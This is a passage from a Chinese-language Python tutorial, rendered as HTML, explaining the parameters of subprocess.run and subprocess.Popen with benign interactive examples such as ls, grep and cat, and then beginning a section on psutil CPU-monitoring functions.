class="meta">&gt;&gt;&gt; </span>proc = run([<span class="string">'ls'</span>,<span class="string">'-l'</span>],shell=<span class="keyword">False</span>)</span><br><span class="line">total <span class="number">79724</span></span><br><span class="line">drwxr-xr-x <span class="number">3</span> root root     <span class="number">4096</span> Sep <span class="number">22</span> <span class="number">19</span>:<span class="number">18</span> bento4</span><br><span class="line">....</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc</span><br><span class="line">CompletedProcess(args=<span class="string">'ls -l'</span>, returncode=<span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc.args</span><br><span class="line">[<span class="string">'ls'</span>, <span class="string">'-l'</span>]</span><br></pre></td></tr></table></figure><ul><li><strong>stdin参数</strong>，指定命令的输入途径，类型为bytes类型；</li><li><strong>stdout参数</strong>，指定命令的输出途径；默认为None，如上面的代码示例，输出就直接打印出来了；</li><li><strong>stderr参数</strong>，指定命令的error输出途径；</li><li><strong>input参数</strong>，命令的具体输入内容，默认None，表示没有输入。input与stdin不能同时使用。先看一个有input参数的例子</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = run(<span class="string">'grep fs'</span>,shell=<span class="keyword">True</span>,input=<span class="string">b'adfs\ncccc\nfsfsf'</span>)</span><br><span class="line">adfs</span><br><span class="line">fsfsf</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc</span><br><span class="line">CompletedProcess(args=<span class="string">'grep fs'</span>, returncode=<span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = run(<span class="string">'grep fs'</span>,shell=<span class="keyword">True</span>,input=<span class="string">b'adfs\ncccc\nfsfsf'</span>,stdout=PIPE)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc</span><br><span class="line">CompletedProcess(args=<span class="string">'grep fs'</span>, returncode=<span class="number">0</span>, stdout=<span class="string">b'adfs\nfsfsf\n'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc.stdout</span><br><span class="line"><span class="string">b'adfs\nfsfsf\n'</span></span><br></pre></td></tr></table></figure><blockquote><p>input默认是一个bytes流。stdout=PIPE，表示将stdout重定向到管道，用了这个参数，grep fs命令的结果，就不会直接打印出来，而是存入了proc.stdout这个管道内。</p><p>下面的例子用到了stderr：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = run(<span class="string">'ls fs'</span>,shell=<span class="keyword">True</span>,stdout=PIPE,stderr=PIPE)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc.stdout</span><br><span class="line"><span class="string">b''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc.stderr</span><br><span class="line"><span class="string">b"ls: cannot access 'fs': No such file or directory\n"</span></span><br></pre></td></tr></table></figure><blockquote><p>看一个stdout与input配合起来使用的例子，有点像我们在Linux shell输入的有管道的命令行：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = run(<span class="string">'grep fs'</span>,shell=<span class="keyword">True</span>,input=<span class="string">b'adfs\ncccc\nfsfsf'</span>,stdout=PIPE)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>run(<span class="string">'cat -n'</span>,shell=<span class="keyword">True</span>, input=proc.stdout)</span><br><span class="line">     <span class="number">1</span>adfs</span><br><span class="line">     <span class="number">2</span>fsfsf</span><br><span class="line">CompletedProcess(args=<span class="string">'cat -n'</span>, returncode=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><blockquote><p>下面是使用stdin的代码例子，stdin的来源是一个文件：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">'tt.t'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = run(<span class="string">'cat -n'</span>, shell=<span class="keyword">True</span>, stdin=f)</span><br><span class="line">     <span class="number">1</span><span class="number">12345</span></span><br><span class="line">     <span class="number">2</span>abcde</span><br><span class="line">     <span class="number">3</span>xyz..</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure><blockquote><p>有一个在命令行常见的用法，就是把stderr重定向到stdout，如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = run(<span class="string">'ls kk'</span>, shell=<span class="keyword">True</span>, stdout=PIPE, stderr=STDOUT)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc.stdout</span><br><span class="line"><span class="string">b"ls: cannot access 'kk': No such file or directory\n"</span></span><br></pre></td></tr></table></figure><ul><li><strong>capture_output参数</strong>，这个参数顾名思义就是捕获进程的输出，stdout和stderr。capture_output=True的效果与设置stdout=PIPE, stderr=PIPE一样。设置了capture_output=True，就不能再设置stdout和stderr：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = run(<span class="string">'ls kk'</span>, shell=<span class="keyword">True</span>, capture_output=<span class="keyword">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc</span><br><span class="line">CompletedProcess(args=<span class="string">'ls kk'</span>, returncode=<span class="number">2</span>, stdout=<span class="string">b''</span>, stderr=<span class="string">b"ls: cannot access 'kk': No such file or directory\n"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc.stdout</span><br><span class="line"><span class="string">b''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc.stderr</span><br><span class="line"><span class="string">b"ls: cannot access 'kk': No such file or directory\n"</span></span><br></pre></td></tr></table></figure><blockquote><p>使用capture_output=True，只是让代码书写上更简单更短一些。</p></blockquote><ul><li><strong>cwd参数</strong>，这个参数指示了当前工作路径。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = run(<span class="string">'ls -lh'</span>, shell=<span class="keyword">True</span>, cwd=<span class="string">'/usr/local'</span>)</span><br><span class="line">total <span class="number">36</span>K</span><br><span class="line">drwxr-xr-x <span class="number">2</span> root root <span class="number">4.0</span>K Feb  <span class="number">9</span> <span class="number">16</span>:<span class="number">12</span> bin</span><br><span class="line">drwxr-xr-x <span class="number">2</span> root root <span class="number">4.0</span>K Feb  <span class="number">9</span> <span class="number">16</span>:<span class="number">12</span> etc</span><br></pre></td></tr></table></figure><ul><li><strong>text参数，universal_newlines参数</strong>，这两个参数的作用是一样的，universal_newlines这个参数的存在也是为了向下兼容（Python3.7开始有text参数，3.5和3.6都是universal_newlines参数），因此我们使用text就好了。<strong>text参数的作用是，将stdin，stdout，stderr修改为string模式</strong>。注意看上面的示例代码，都是bytes流</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>run(<span class="string">'grep fs'</span>, shell=<span class="keyword">True</span>, input=<span class="string">b'asdfs\nfdfs'</span>, capture_output=<span class="keyword">True</span>)</span><br><span class="line">CompletedProcess(args=<span class="string">'grep fs'</span>, returncode=<span class="number">0</span>, stdout=<span class="string">b'asdfs\nfdfs\n'</span>, stderr=<span class="string">b''</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>run(<span class="string">'grep fs'</span>, shell=<span class="keyword">True</span>, input=<span class="string">'asdfs\nfdfs'</span>, capture_output=<span class="keyword">True</span>, text=<span class="keyword">True</span>) </span><br><span class="line">CompletedProcess(args=<span class="string">'grep fs'</span>, returncode=<span class="number">0</span>, stdout=<span class="string">'asdfs\nfdfs\n'</span>, stderr=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>timeout参数</strong>，设置进程执行的超时时间。如果时间到子进程还未结束， subprocess.TimeoutExpired异常会抛出。timeout参数的单位是秒。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">try</span>:</span><br><span class="line"><span class="meta">... </span>    run(<span class="string">'python3'</span>, shell=<span class="keyword">True</span>, input=<span class="string">b'import time;time.sleep(30)'</span>, timeout=<span class="number">1</span>)</span><br><span class="line"><span class="meta">... </span><span class="keyword">except</span> TimeoutExpired:</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'timeout happened...'</span>)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">timeout happened...</span><br></pre></td></tr></table></figure><blockquote><p>以上代码，就是sleep 30秒，run函数设置timeout为1秒，触发subprocess.TimeoutExpired后，打印一点信息出来。</p></blockquote><ul><li><strong>check参数</strong>，如果check=True，在子进程的返回不为0的时候，抛出subprocess.CalledProcessError异常。这时，run函数返回的CompletedProcess对象的returncode不可用。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">try</span>:</span><br><span class="line"><span class="meta">... </span>    proc = run(<span class="string">'ls kk'</span>, shell=<span class="keyword">True</span>, check=<span class="keyword">True</span>, stderr=PIPE)</span><br><span class="line"><span class="meta">... </span><span class="keyword">except</span> CalledProcessError:</span><br><span class="line"><span class="meta">... </span>    print(proc.returncode)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><blockquote><p>上面这段代码，走到了except里面，因为kk目录不存在，但是打印出来的returncode却是0，run函数没有成功返回，而是抛出异常，因此返回值不可用。</p></blockquote><h4 id="2-subprocess-Popen"><a href="#2-subprocess-Popen" class="headerlink" title="2.subprocess.Popen()"></a>2.subprocess.Popen()</h4><blockquote><p>run函数的底层，就是Popen函数。</p><ul><li><p>run函数是<strong>同步</strong>的，要等待子进程实行结束，或者超时。</p></li><li><p>Popen创建子进程后，采用<strong>异步</strong>的方式，不会等待，要通过poll函数来判断子进程是否执行完毕。</p></li></ul><p>总的来说，Popen比run要更加灵活，如果run函数还不能满足你的需求，就考虑Popen吧。</p></blockquote><p><code>语句格式</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Popen(args, bufsize=<span class="number">-1</span>, executable=<span class="keyword">None</span>, stdin=<span class="keyword">None</span>, stdout=<span class="keyword">None</span>, stderr=<span class="keyword">None</span>, </span><br><span class="line">preexec_fn=<span class="keyword">None</span>, close_fds=<span class="keyword">True</span>, shell=<span class="keyword">False</span>, cwd=<span class="keyword">None</span>, env=<span class="keyword">None</span>, </span><br><span class="line">universal_newlines=<span class="keyword">None</span>, startupinfo=<span class="keyword">None</span>, creationflags=<span class="number">0</span>, </span><br><span class="line">restore_signals=<span class="keyword">True</span>, start_new_session=<span class="keyword">False</span>, pass_fds=(), *,</span><br><span class="line">encoding=<span class="keyword">None</span>, errors=<span class="keyword">None</span>, text=<span class="keyword">None</span>)</span><br></pre></td></tr></table></figure><blockquote><p>参数args，stdin，stdout，stderr，shell，cwd，universal_newlines，text与run函数的含义和用法都是一样的。</p></blockquote><p><code>参数说明</code></p><div class="table-container"><table><thead><tr><th>参数名称</th><th>说明</th></tr></thead><tbody><tr><td>args</td><td>字符串或者是列表，表示被调用程序的路径和参数</td></tr><tr><td>bufsize</td><td>0 表示无缓存 1 表示行缓冲 其它正值 表示缓冲区大小 负值 采用系统默认缓冲(全缓冲)</td></tr><tr><td>executable</td><td>可执行程序，如果为None取args列表的第一个值</td></tr><tr><td>stdin stdout stderr</td><td>None 没有任何重定向，继承父进程 PIPE 创建管道 文件对象 文件描述符(整数) stderr 还可以设置为STDOUT</td></tr><tr><td>preexec_fn</td><td>钩子函数，在fork和exec之前执行(unix)</td></tr><tr><td>close_fds</td><td>unix下执行新进程之前是否关闭0/1/2之外的文件 windows下不继承是继承父进程的文件描述符</td></tr><tr><td>shell</td><td>unix下相当于在args前面添加了”/bin/sh” “-c” window下相当于添加”cmd.exe /c”</td></tr><tr><td>cwd</td><td>设置工作目录</td></tr><tr><td>env</td><td>设置环境变量</td></tr><tr><td>universal_newlines</td><td>添加换行符”\n”</td></tr><tr><td>startupinfo</td><td>window下传递给CreateProcess的结构体</td></tr><tr><td>creationflags</td><td>window下，传递CREATE_NEW_CONSOLE创建自己的控制台窗口</td></tr></tbody></table></div><p><code>方法说明</code></p><div class="table-container"><table><thead><tr><th>方法名称</th><th>说明</th></tr></thead><tbody><tr><td>poll()</td><td>检查子进程是否已经结束，设置并返回returncode属性，非结束返回None</td></tr><tr><td>wait()</td><td>阻塞主进程等待子线程完成，返回returncode，注意：如果子进程输出了大量数据到stdout或者stderr的管道，并达到了系统pipe的缓存大小的话，子进程会等待父进程读取管道，而父进程此时正wait着的话，将会产生传说中的死锁，后果是非常严重滴。建议使用communicate() 来避免这种情况的发生。</td></tr><tr><td>communicate(input=None)</td><td>和子进程交互，发送数据到stdin，并从stdout和stderr读数据，直到收到EOF，阻塞，一直等待子进程结束。input输出要为字符串。该方法返回一个元组(stdoutdata,stderrdata)。注意：要给子进程的stdin发送数据，则Popen的时候，stdin要为PIPE；同理，要可以接收数据的话，stdout或者stderr也要为PIPE。</td></tr><tr><td>send_signal(signal)</td><td>在子进程发送signal信号，注意：window下目前只支持发送SIGTERM，等效于小面的terminate()</td></tr><tr><td>terminate()</td><td>停止子进程。Posix下是发送SIGTERM信号。windows下是调用TerminateProcess()这个API。</td></tr><tr><td>kill()</td><td>杀死子进程。Posix下是发送SIGKILL信号。windows下和terminate() 无异。</td></tr><tr><td>stdin</td><td>如果stdin 参数是PIPE，此属性就是一个文件对象，否则为None 。</td></tr><tr><td>stdout</td><td>如果stdout参数是PIPE，此属性就是一个文件对象，否则为None。</td></tr><tr><td>stderr</td><td>如果stderr参数是PIP，此属性就是一个文件对象，否则为None。</td></tr><tr><td>pid</td><td>子进程的进程号。注意，如果shell 参数为True，这属性指的是子shell的进程号。</td></tr><tr><td>returncode</td><td>子程序的返回值，由poll()或者wait()设置，间接地也由communicate()设置。 如果为None，表示子进程还没终止。 如果为负数-N的话，表示子进程被N号信号终止。（仅限unix）返回2的话表示出现错误。</td></tr></tbody></table></div><p><code>基本用法</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = Popen(<span class="string">'ls -hl'</span>, shell=<span class="keyword">True</span>, stdout=PIPE, stderr=STDOUT)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>out, _ = proc.communicate()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(out.decode())</span><br><span class="line">total <span class="number">37</span>M</span><br><span class="line">-rw-r--r--  <span class="number">1</span> xinlin xinlin  <span class="number">535</span> Jun <span class="number">29</span> <span class="number">06</span>:<span class="number">03</span> apache_log_reader.py</span><br><span class="line">-rw-r--r--  <span class="number">1</span> xinlin xinlin <span class="number">3.2</span>M Jun <span class="number">30</span> <span class="number">02</span>:<span class="number">55</span> py.maixj.sql</span><br><span class="line">-rw-r--r--  <span class="number">1</span> xinlin xinlin <span class="number">3.2</span>M Jun <span class="number">29</span> <span class="number">19</span>:<span class="number">20</span> py.online.sql</span><br><span class="line">drwxr-xr-x <span class="number">19</span> xinlin xinlin <span class="number">4.0</span>K Jun <span class="number">28</span> <span class="number">23</span>:<span class="number">24</span> Python<span class="number">-3.7</span><span class="number">.3</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> xinlin xinlin  <span class="number">22</span>M Mar <span class="number">25</span> <span class="number">13</span>:<span class="number">59</span> Python<span class="number">-3.7</span><span class="number">.3</span>.tgz</span><br><span class="line">-rw-r--r--  <span class="number">1</span> xinlin xinlin   <span class="number">27</span> Jul  <span class="number">5</span> <span class="number">01</span>:<span class="number">05</span> sleep.py</span><br><span class="line">-rw-r--r--  <span class="number">1</span> xinlin xinlin   <span class="number">18</span> Jul  <span class="number">5</span> <span class="number">00</span>:<span class="number">10</span> tt.t</span><br><span class="line">-rw-r--r--  <span class="number">1</span> xinlin xinlin  <span class="number">800</span> Jun <span class="number">29</span> <span class="number">03</span>:<span class="number">26</span> walktree.py</span><br><span class="line">-rw-r--r--  <span class="number">1</span> xinlin xinlin <span class="number">8.2</span>M Jun <span class="number">29</span> <span class="number">05</span>:<span class="number">47</span> www.access_log_2019_06_28</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc.returncode</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc.pid</span><br><span class="line"><span class="number">2985</span></span><br></pre></td></tr></table></figure><blockquote><p>Popen函数以异步的方式创建一个子进程，返回一个Popen对象。我们通过 <code>communicate</code> 函数来获取stdout和stderr。communicate函数返回一个tuple，以上示例是将stderr=STDOUT，因此使用 _ 来表示为空的stderr。</p></blockquote><p>Popen对象的communicate函数有两个参数，input和timeout，分别用来设置给子进程的输入和超时时间。有timeout参数，表示communicate函数会等待子进程执行结束，或者超时。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = Popen(<span class="string">'grep fs'</span>, shell=<span class="keyword">True</span>, stdin=PIPE, stdout=PIPE, stderr=PIPE)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>out, err = proc.communicate(<span class="string">b'adfs\nfsmnjkl'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>out</span><br><span class="line"><span class="string">b'adfs\nfsmnjkl\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>err</span><br><span class="line"><span class="string">b''</span></span><br></pre></td></tr></table></figure><blockquote><p> <strong>注意对returncode的赋值，如果timeout发生，returncode就是not defined。当然也可以通过proc.returncode来获取。如果异常，proc.returncode的值是None。</strong></p></blockquote><p>很多时候，我们确定子进程会执行结束，只是无法确定需要的时间长度，这种情况就要用 <code>poll</code> 函数来判断子进程的执行是否结束：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">test_Popen</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">import</span> time</span><br><span class="line"><span class="meta">... </span>    proc=Popen(<span class="string">'python3 -c "import time;time.sleep(10)"'</span>,shell=<span class="keyword">True</span>,stdout=PIPE)</span><br><span class="line"><span class="meta">... </span>    i = <span class="number">0</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="meta">... </span>        returncode = proc.poll()</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">if</span> returncode <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line"><span class="meta">... </span>            time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="meta">... </span>            i += <span class="number">2</span></span><br><span class="line"><span class="meta">... </span>            print(<span class="string">'sleep'</span>,i,<span class="string">'seconds'</span>)</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">continue</span></span><br><span class="line"><span class="meta">... </span>        <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>            print(<span class="string">'sub process is terminated with returncode'</span>,returncode)</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">break</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test_Popen()</span><br><span class="line">sleep <span class="number">2</span> seconds</span><br><span class="line">sleep <span class="number">4</span> seconds</span><br><span class="line">sleep <span class="number">6</span> seconds</span><br><span class="line">sleep <span class="number">8</span> seconds</span><br><span class="line">sleep <span class="number">10</span> seconds</span><br><span class="line">sleep <span class="number">12</span> seconds</span><br><span class="line">sub process <span class="keyword">is</span> terminated <span class="keyword">with</span> returncode <span class="number">0</span></span><br></pre></td></tr></table></figure><p>Popen对象还有下列几个成员函数，以后有机缘时，再上示例代码吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Popen.send_signal(signal)</span><br><span class="line">Popen.terminate()</span><br><span class="line">Popen.kill()</span><br></pre></td></tr></table></figure><p>那么我们到底该用哪个模块、哪个函数来执行命令与系统及系统进行交互呢？下面我们来做个总结：</p><ul><li>首先应该知道的是，Python2.4版本引入了subprocess模块用来替换os.system()、os.popen()、os.spawn*()等函数以及commands模块；也就是说如果你使用的是Python 2.4及以上的版本就应该使用subprocess模块了。</li><li>如果你的应用使用的Python 2.4以上，但是是Python 3.5以下的版本，Python官方给出的建议是使用subprocess.call()函数。Python 2.5中新增了一个subprocess.check_call()函数，Python 2.7中新增了一个subprocess.check_output()函数，这两个函数也可以按照需求进行使用。</li><li>如果你的应用使用的是Python 3.5及以上的版本（目前应该还很少），Python官方给出的建议是尽量使用subprocess.run()函数。</li><li>当subprocess.call()、subprocess.check_call()、subprocess.check_output()和subprocess.run()这些高级函数无法满足需求时，我们可以使用subprocess.Popen类来实现我们需要的复杂功能。</li></ul><h3 id="0x0C-psutil-模块"><a href="#0x0C-psutil-模块" class="headerlink" title="0x0C psutil 模块"></a>0x0C psutil 模块</h3><p><a href="https://psutil.readthedocs.io/en/latest/" target="_blank" rel="noopener">更多详情查看 psutil 官方文档</a></p><h4 id="1-CPU相关函数"><a href="#1-CPU相关函数" class="headerlink" title="1.CPU相关函数"></a>1.CPU相关函数</h4><p><code># psutil.cpu_times()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.cpu_times()</span><br><span class="line">scputimes(user=<span class="number">50609.84375</span>, system=<span class="number">42631.203125</span>, idle=<span class="number">2186933.671875</span>, interrupt=<span class="number">3711.875</span>, dpc=<span class="number">2620.375</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Return system CPU times as a named tuple. Every attribute represents the seconds the CPU has spent in the given mode. The attributes availability varies depending on the platform:</p><ul><li><strong>user</strong>: time spent by normal processes executing in user mode; on Linux this also includes <strong>guest</strong> time</li><li><strong>system</strong>: time spent by processes executing in kernel mode</li><li><strong>idle</strong>: time spent doing nothing</li></ul></blockquote><p><code># psutil.cpu_percent (interval=None, percpu=False)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.cpu_percent()</span><br><span class="line"><span class="number">3.8</span></span><br></pre></td></tr></table></figure><blockquote><p>返回一个浮点数，以百分比表示当前系统范围内的CPU使用率。当interval&gt; 0.0时，将比较该间隔前后的系统CPU时间（阻塞）。当interval为0.0或无时，比较自上次调用或模块导入以来经过的系统CPU时间，立即返回。</p></blockquote><p><code># psutil.cpu_times_percent()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.cpu_times_percent()</span><br><span class="line">scputimes(user=<span class="number">2.4</span>, system=<span class="number">1.5</span>, idle=<span class="number">96.0</span>, interrupt=<span class="number">0.1</span>, dpc=<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><p><code># psutil.cpu_count(logical=True)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.cpu_count(logical=<span class="keyword">True</span>)   <span class="comment"># 默认是True</span></span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.cpu_count(logical=<span class="keyword">False</span>)</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure><blockquote><p>返回系统中逻辑CPU的数量（与Python 3.4中的os.cpu_count相同）；如果不确定，则返回None。逻辑核心是指物理核心的数量乘以每个核心上可以运行的线程的数量（称为超线程）。如果逻辑为False，则仅返回物理核心数（不包括超线程CPU），如果不确定，则返回None。</p><p>请注意，此上面的数目不等于当前进程实际可以使用的CPU数目。如果更改了进程CPU亲和力，正在使用Linux cgroup或在使用处理器组或具有64个以上CPU的Windows系统上，则可能有所不同。</p><p><strong>问题</strong>：什么是超线程？？</p></blockquote><p><code># psutil.cpu_percent()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="meta">... </span>    print(psutil.cpu_percent(interval=<span class="number">1</span>, percpu=<span class="keyword">True</span>))</span><br><span class="line">...</span><br><span class="line">[<span class="number">4.6</span>, <span class="number">0.0</span>, <span class="number">6.2</span>, <span class="number">1.6</span>, <span class="number">6.2</span>, <span class="number">0.0</span>, <span class="number">6.2</span>, <span class="number">1.6</span>, <span class="number">6.2</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>]</span><br><span class="line">[<span class="number">4.6</span>, <span class="number">0.0</span>, <span class="number">15.6</span>, <span class="number">1.6</span>, <span class="number">6.2</span>, <span class="number">1.6</span>, <span class="number">3.1</span>, <span class="number">6.2</span>, <span class="number">7.8</span>, <span class="number">1.6</span>, <span class="number">7.8</span>, <span class="number">0.0</span>]</span><br><span class="line">[<span class="number">7.7</span>, <span class="number">3.1</span>, <span class="number">10.9</span>, <span class="number">6.2</span>, <span class="number">14.1</span>, <span class="number">0.0</span>, <span class="number">1.6</span>, <span class="number">1.6</span>, <span class="number">12.5</span>, <span class="number">0.0</span>, <span class="number">3.1</span>, <span class="number">0.0</span>]</span><br><span class="line">[<span class="number">6.2</span>, <span class="number">0.0</span>, <span class="number">10.9</span>, <span class="number">0.0</span>, <span class="number">1.6</span>, <span class="number">0.0</span>, <span class="number">1.6</span>, <span class="number">0.0</span>, <span class="number">4.7</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>]</span><br><span class="line">[<span class="number">10.8</span>, <span class="number">0.0</span>, <span class="number">7.8</span>, <span class="number">1.6</span>, <span class="number">3.1</span>, <span class="number">1.6</span>, <span class="number">3.1</span>, <span class="number">4.7</span>, <span class="number">9.4</span>, <span class="number">0.0</span>, <span class="number">4.7</span>, <span class="number">0.0</span>]</span><br><span class="line">[<span class="number">1.6</span>, <span class="number">0.0</span>, <span class="number">7.8</span>, <span class="number">4.7</span>, <span class="number">4.7</span>, <span class="number">0.0</span>, <span class="number">4.7</span>, <span class="number">0.0</span>, <span class="number">9.4</span>, <span class="number">0.0</span>, <span class="number">4.7</span>, <span 